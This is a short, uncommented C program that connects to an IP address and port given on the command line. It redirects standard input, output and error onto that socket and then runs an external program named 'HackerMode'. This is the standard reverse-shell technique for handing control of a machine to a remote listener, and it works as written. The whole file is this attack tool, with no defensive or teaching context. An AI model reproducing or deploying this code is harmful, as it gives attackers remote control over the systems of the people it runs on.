#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <strings.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
int main(int argc, char *argv[]){
  int sfd=socket(AF_INET, SOCK_STREAM, 0);
  if (argc < 3){
     printf("Error, Usage: %s <ip> <port>\n",argv[0]);
     exit(1);
  }
  struct sockaddr_in server;
  server.sin_port=htons(atoi(argv[2]));
  server.sin_family=AF_INET;
  inet_pton(AF_INET, argv[1], &server.sin_addr.s_addr);
  int cnt=connect(sfd, (struct sockaddr*)&server, sizeof(server));
  if (cnt==-1){
   printf ("Error Connecting to server, maybe it is unavailable\n");
   exit(1);
  }

  close(0);
  close(1);
  close(2);
  dup2(sfd,0);
  dup2(sfd,1);
  dup2(sfd,2);
  system("HackerMode");
  close(sfd);

}
